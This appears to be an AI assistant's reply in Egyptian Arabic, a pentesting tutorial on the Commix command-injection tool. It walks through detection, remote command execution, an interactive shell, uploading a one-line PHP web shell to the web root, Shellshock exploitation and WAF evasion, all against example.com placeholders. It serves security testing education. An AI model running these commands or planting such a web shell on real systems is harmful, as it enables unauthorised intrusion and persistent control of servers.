تمام، هنشرح **Commix** بعمق عملي كأداة لاستغلال Command Injection، مع أكواد وتفاصيل، وهنركز على الجوانب اللي تهمك كـ pentester. هقسم الموضوع لأجزاء مختلفة عن استخدام Commix، وبعد كل جزء هحط خلاصة طريفة بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال. يلا نبدأ!

---

### **1. اكتشاف الثغرة باستخدام Commix**
#### **إيه هو؟**
 ال Commix هي أداة مفتوحة المصدر بتستخدم لاختبار واكتشاف ثغرات Command Injection في التطبيقات الويب تلقائيًا، سواء كانت الثغرة في باراميتر أو هيدر.

#### **ازاي بيشتغل؟**
بتديله الـ URL أو الطلب (Request) اللي ممكن يكون فيه ثغرة، وهو بيجرب كذا تقنية (زي Classic، Blind، Time-Based) ويرجعلك لو لقى حاجة.

#### **مثال عملي:**
- **اختبار URL بسيط:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1"
  ```
  لو الـ `ip` قابل للحقن، هيقولك "The parameter 'ip' is vulnerable".

- **اختبار POST Request:**
  لو في فورم:
  ```
  commix --url="http://example.com/login.php" --data="username=admin&password=test"
  ```
  هيختبر الـ `username` و `password`.

- **اختبار سريع:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1" --batch
  ```
  الـ `--batch` بيخليه يجاوب تلقائيًا من غير ما يسألك.

#### **خلاصة طريفة:**
تخيل إنك بتبعت واحد بيشوف البيت فيه خرم ولا لأ، لو لقى خرم بيقولك "خش بسرعة، الباب مفتوح يا كبير!"

---

### **2. تنفيذ أوامر مباشرة**
#### **إيه هو؟**
Commix مش بس بيكتشف الثغرة، لكنه كمان بيسمحلك تنفذ أوامر نظام زي `whoami` أو `dir` على السيرفر لو الثغرة شغالة.

#### **ازاي بيشتغل؟**
بعد ما يكتشف الثغرة، بيفتحلك شيل (Pseudo-Terminal) تكتب فيه الأوامر.

#### **مثال عملي:**
- **تشغيل أمر معين:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1" --os-cmd="whoami"
  ```
  لو نجح، هيرجعلك اسم المستخدم (زي `www-data`).

- **فتح شيل:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1"
  ```
  لو لقى ثغرة، بيسألك:
  ```
  Do you want a Pseudo-Terminal shell? [Y/n/q]
  ```
  اكتب `Y`، وبعدين اكتب أوامر زي:
  ```
  commix(os_shell) > whoami
  ```

#### **خلاصة طريفة:**
تخيل إنك بتكلم السيرفر وتقوله "قوللي مين إنت؟"، لو رد عليك "أنا فلان"، يبقى بقيت إنت اللي بتحكمه!

---

### **3. كتابة ملفات على السيرفر**
#### **إيه هو؟**
Commix بيقدر يكتب ملفات على السيرفر لو الثغرة تسمح، وكده تقدر ترفع شيل دائم.

#### **ازاي بيشتغل؟**
بتستخدم خيارات زي `--file-write` و `--file-dest` عشان تكتب ملف في مكان معين.

#### **مثال عملي:**
- **كتابة شيل:**
  اصنع ملف شيل:
  ```
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  ```
  شغل:
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
  ```
  افتح:
  ```
  http://example.com/shell.php?cmd=whoami
  ```

#### **خلاصة طريفة:**
تخيل إنك بتبعت ورقة تعليمات للسيرفر "اعمل اللي أقولك عليه"، لو نفذها يبقى بقيت إنت المالك بتاع البيت!

---

### **4. استغلال Shellshock**
#### **إيه هو؟**
Commix بيقدر يستغل ثغرة Shellshock (في Bash) لو الموقع معرض ليها، ويديك شيل كامل.

#### **ازاي بيشتغل؟**
بتضيف `--shellshock` وهو بيختبر الثغرة دي.

#### **مثال عملي:**
- **اختبار Shellshock:**
  ```
  commix --url="http://example.com/cgi-bin/test.sh" --shellshock
  ```
  لو نجح، هيفتح شيل:
  ```
  commix(os_shell) > id
  ```

#### **خلاصة طريفة:**
تخيل إنك بتخبط على باب قديم مكسور، لو اتفتح بسهولة يبقى دخلت البيت من غير مفتاح!

---

### **5. تخصيص الاختبار (Advanced Options)**
#### **إيه هو؟**
Commix فيه خيارات متقدمة عشان تتحكم في الاختبار، زي اختيار نوع الثغرة أو اختبار هيدرز.

#### **ازاي بيشتغل؟**
بتستخدم أوامر زي `--level` أو `--technique` عشان تظبط الاختبار.

#### **مثال عملي:**
- **اختبار هيدرز:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1" --level=3
  ```
  الـ `--level=3` بيختبر الهيدرز زي `User-Agent`.

- **تحديد تقنية:**
  ```
  commix --url="http://example.com/ping.php?ip=127.0.0.1" --technique=T
  ```
  الـ `T` لـ Time-Based بس.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحبك "فتش البيت كله، حتى الستاير افتحها"، لو لقى حاجة يبقى جاب الكنز بسرعة!

---

### **خطوات عملية للاستغلال كـ Pentester**
1. **اكتشاف الثغرة:**
   - ابدأ بـ:
     ```
     commix --url="http://example.com/ping.php?ip=127.0.0.1" --batch
     ```
   - لو POST، استخدم:
     ```
     commix --url="http://example.com/login.php" --data="username=admin&password=test"
     ```

2. **تنفيذ أوامر:**
   - جرب أمر مباشر:
     ```
     commix --url="http://example.com/ping.php?ip=127.0.0.1" --os-cmd="whoami"
     ```
   - أو افتح شيل:
     ```
     commix --url="http://example.com/ping.php?ip=127.0.0.1"
     ```

3. **كتابة شيل:**
   - اصنع ملف:
     ```
     echo '<?php system($_GET["cmd"]); ?>' > shell.php
     ```
   - ارفعه:
     ```
     commix --url="http://example.com/ping.php?ip=127.0.0.1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
     ```

4. **اختبار Shellshock:**
   - شغل:
     ```
     commix --url="http://example.com/cgi-bin/test.sh" --shellshock
     ```

5. **تخصيص:**
   - لو عايز تختبر هيدرز:
     ```
     commix --url="http://example.com/ping.php?ip=127.0.0.1" --level=3 --batch
     ```

#### **نصيحة:**
- لو في حماية زي WAF، جرب `--tamper` (زي `--tamper=space2comment`).
- دوّن كل أمر ونتايجه في تقريرك.

---

ها، عايز أشرح حاجة زيادة زي `--tamper` أو أجرب معاك مثال معين؟